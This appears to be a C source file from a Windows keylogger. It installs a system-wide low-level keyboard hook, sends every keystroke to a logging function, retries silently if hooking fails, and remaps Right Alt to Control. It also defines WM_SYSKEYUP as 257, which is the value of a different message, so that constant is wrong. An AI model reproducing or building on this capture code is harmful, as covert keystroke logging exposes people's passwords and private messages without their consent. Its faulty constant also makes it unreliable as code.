#include "header.h"
# define WM_SYSKEYUP 257

HHOOK hook;
KBDLLHOOKSTRUCT hook_struct;

void StartKeyBoardHook()
{
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, NULL, 0)))
	{
		// HOOK ERROR
		Sleep(10000);
		StartKeyBoardHook();
	}
}


LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) 
{
	hook_struct = *((KBDLLHOOKSTRUCT*)lParam);
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
			edit_log(analyse_keyboard_status(hook_struct.vkCode));
		else if (wParam == WM_SYSKEYDOWN && hook_struct.vkCode == 165) // != modifié en ==
			keybd_event(VK_CONTROL, 0, 0, 0); 
		else if (wParam == WM_SYSKEYUP && hook_struct.vkCode == 165)
			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); 
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void ReleaseHook()
{
	UnhookWindowsHookEx(hook);
}
